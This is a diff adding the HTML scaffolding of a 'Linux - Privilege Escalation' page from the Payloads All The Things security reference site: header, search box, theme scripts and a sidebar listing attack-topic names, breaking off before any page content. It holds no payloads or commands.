@@ -1,0 +1,4972 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.3.1, mkdocs-material-8.4.3">
+    
+    
+      
+        <title>Linux - Privilege Escalation - Payloads All The Things</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.6b80c2a2.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.cbb835fc.min.css">
+        
+      
+      
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent="">
+  
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#linux-privilege-escalation" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Payloads All The Things" class="md-header__button md-logo" aria-label="Payloads All The Things" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Payloads All The Things
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Linux - Privilege Escalation
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <form class="md-header__option" data-md-component="palette">
+        
+          
+          
+          <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+          
+            <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+            </label>
+          
+        
+          
+          
+          <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
+          
+            <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+            </label>
+          
+        
+      </form>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Payloads All The Things" class="md-nav__button md-logo" aria-label="Payloads All The Things" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    Payloads All The Things
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        Payloads All The Things [![Tweet](https://img.shields.io/twitter/url/http/shields.io.svg?style=social)](https://twitter.com/intent/tweet?text=Payloads%20All%20The%20Things,%20a%20list%20of%20useful%20payloads%20and%20bypasses%20for%20Web%20Application%20Security%20-%20by%20@pentest_swissky&url=https://github.com/swisskyrepo/PayloadsAllTheThings/)
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../BOOKS/" class="md-nav__link">
+        Books
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CONTRIBUTING/" class="md-nav__link">
+        CONTRIBUTING
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TWITTER/" class="md-nav__link">
+        Twitter
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../YOUTUBE/" class="md-nav__link">
+        Youtube
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" type="checkbox" id="__nav_6" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6">
+          API Key Leaks
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="API Key Leaks" data-md-level="1">
+        <label class="md-nav__title" for="__nav_6">
+          <span class="md-nav__icon md-icon"></span>
+          API Key Leaks
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../API%20Key%20Leaks/" class="md-nav__link">
+        API Key Leaks
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7" type="checkbox" id="__nav_7" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_7">
+          AWS Amazon Bucket S3
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="AWS Amazon Bucket S3" data-md-level="1">
+        <label class="md-nav__title" for="__nav_7">
+          <span class="md-nav__icon md-icon"></span>
+          AWS Amazon Bucket S3
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AWS%20Amazon%20Bucket%20S3/" class="md-nav__link">
+        Amazon Bucket S3 AWS
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8" type="checkbox" id="__nav_8" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8">
+          Account Takeover
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Account Takeover" data-md-level="1">
+        <label class="md-nav__title" for="__nav_8">
+          <span class="md-nav__icon md-icon"></span>
+          Account Takeover
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Account%20Takeover/" class="md-nav__link">
+        Account Takeover
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_9" type="checkbox" id="__nav_9" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_9">
+          CORS Misconfiguration
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CORS Misconfiguration" data-md-level="1">
+        <label class="md-nav__title" for="__nav_9">
+          <span class="md-nav__icon md-icon"></span>
+          CORS Misconfiguration
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CORS%20Misconfiguration/" class="md-nav__link">
+        CORS Misconfiguration
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_10" type="checkbox" id="__nav_10" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_10">
+          CRLF Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CRLF Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_10">
+          <span class="md-nav__icon md-icon"></span>
+          CRLF Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CRLF%20Injection/" class="md-nav__link">
+        CRLF
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_11" type="checkbox" id="__nav_11" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_11">
+          CSRF Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CSRF Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_11">
+          <span class="md-nav__icon md-icon"></span>
+          CSRF Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CSRF%20Injection/" class="md-nav__link">
+        Cross-Site Request Forgery
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_12" type="checkbox" id="__nav_12" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_12">
+          CSV Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CSV Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_12">
+          <span class="md-nav__icon md-icon"></span>
+          CSV Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CSV%20Injection/" class="md-nav__link">
+        CSV Injection (Formula Injection)
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_13" type="checkbox" id="__nav_13" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_13">
+          CVE Exploits
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CVE Exploits" data-md-level="1">
+        <label class="md-nav__title" for="__nav_13">
+          <span class="md-nav__icon md-icon"></span>
+          CVE Exploits
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CVE%20Exploits/" class="md-nav__link">
+        Common Vulnerabilities and Exposures
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CVE%20Exploits/Log4Shell/" class="md-nav__link">
+        CVE-2021-44228 Log4Shell
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_14" type="checkbox" id="__nav_14" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_14">
+          Command Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Command Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_14">
+          <span class="md-nav__icon md-icon"></span>
+          Command Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Command%20Injection/" class="md-nav__link">
+        Command Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_15" type="checkbox" id="__nav_15" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_15">
+          DNS Rebinding
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="DNS Rebinding" data-md-level="1">
+        <label class="md-nav__title" for="__nav_15">
+          <span class="md-nav__icon md-icon"></span>
+          DNS Rebinding
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../DNS%20Rebinding/" class="md-nav__link">
+        DNS Rebinding
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_16" type="checkbox" id="__nav_16" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_16">
+          Dependency Confusion
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Dependency Confusion" data-md-level="1">
+        <label class="md-nav__title" for="__nav_16">
+          <span class="md-nav__icon md-icon"></span>
+          Dependency Confusion
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Dependency%20Confusion/" class="md-nav__link">
+        Dependency Confusion
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_17" type="checkbox" id="__nav_17" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_17">
+          Directory Traversal
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Directory Traversal" data-md-level="1">
+        <label class="md-nav__title" for="__nav_17">
+          <span class="md-nav__icon md-icon"></span>
+          Directory Traversal
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Directory%20Traversal/" class="md-nav__link">
+        Directory traversal
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_18" type="checkbox" id="__nav_18" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_18">
+          File Inclusion
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="File Inclusion" data-md-level="1">
+        <label class="md-nav__title" for="__nav_18">
+          <span class="md-nav__icon md-icon"></span>
+          File Inclusion
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../File%20Inclusion/" class="md-nav__link">
+        File Inclusion
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_19" type="checkbox" id="__nav_19" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_19">
+          GraphQL Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="GraphQL Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_19">
+          <span class="md-nav__icon md-icon"></span>
+          GraphQL Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../GraphQL%20Injection/" class="md-nav__link">
+        GraphQL injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_20" type="checkbox" id="__nav_20" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_20">
+          HTTP Parameter Pollution
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="HTTP Parameter Pollution" data-md-level="1">
+        <label class="md-nav__title" for="__nav_20">
+          <span class="md-nav__icon md-icon"></span>
+          HTTP Parameter Pollution
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HTTP%20Parameter%20Pollution/" class="md-nav__link">
+        HTTP Parameter Pollution
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_21" type="checkbox" id="__nav_21" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_21">
+          Insecure Deserialization
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Insecure Deserialization" data-md-level="1">
+        <label class="md-nav__title" for="__nav_21">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Deserialization
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Deserialization/" class="md-nav__link">
+        Insecure Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Deserialization/Java/" class="md-nav__link">
+        Java Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Deserialization/PHP/" class="md-nav__link">
+        PHP Object injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Deserialization/Python/" class="md-nav__link">
+        Python Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
